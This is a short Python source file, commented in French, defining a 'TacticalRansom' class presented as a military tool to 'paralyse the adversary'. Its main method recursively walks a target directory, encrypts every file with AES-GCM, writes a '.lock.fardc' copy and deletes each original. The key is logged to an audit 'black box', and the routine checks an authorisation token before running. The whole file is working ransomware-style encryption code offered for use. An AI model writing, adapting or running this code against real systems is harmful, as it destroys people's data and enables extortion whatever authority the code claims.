import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from core.gatekeeper import Gatekeeper
from audit_blackbox.chain_sealer import ChainSealer

class TacticalRansom:
    def __init__(self):
        self.sealer = ChainSealer()
        self.extension = ".lock.fardc" # Marqueur de souveraineté

    def execute_immobilization(self, target_directory, auth_token):
        """
        Chiffre les données logistiques cibles pour paralyser l'adversaire.
        """
        # 1. Validation de l'ordre de l'État-Major
        if not Gatekeeper.validate_session(auth_token):
            raise PermissionError("Action offensive non autorisée par le Gatekeeper.")

        # 2. Génération d'une clé unique pour cette opération
        key = AESGCM.generate_key(bit_length=256)
        aesgcm = AESGCM(key)
        
        # 3. Scellement de la clé dans la Boîte Noire (pour réversion future)
        self.sealer.log_action("TACTICAL_ENCRYPTION_START", {
            "target": target_directory,
            "recovery_key": key.hex(),
            "op_id": auth_token.id
        })

        # 4. Parcours et chiffrement des fichiers
        for root, dirs, files in os.walk(target_directory):
            for file in files:
                file_path = os.path.join(root, file)
                self._encrypt_file(file_path, aesgcm)

        print(f"[OFFENSIVE] Paralysie terminée sur {target_directory}")

    def _encrypt_file(self, file_path, cipher):
        with open(file_path, "rb") as f:
            data = f.read()
        
        nonce = os.urandom(12)
        ciphertext = cipher.encrypt(nonce, data, None)
        
        with open(file_path + self.extension, "wb") as f:
            f.write(nonce + ciphertext)
        
        os.remove(file_path) # Suppression de l'original

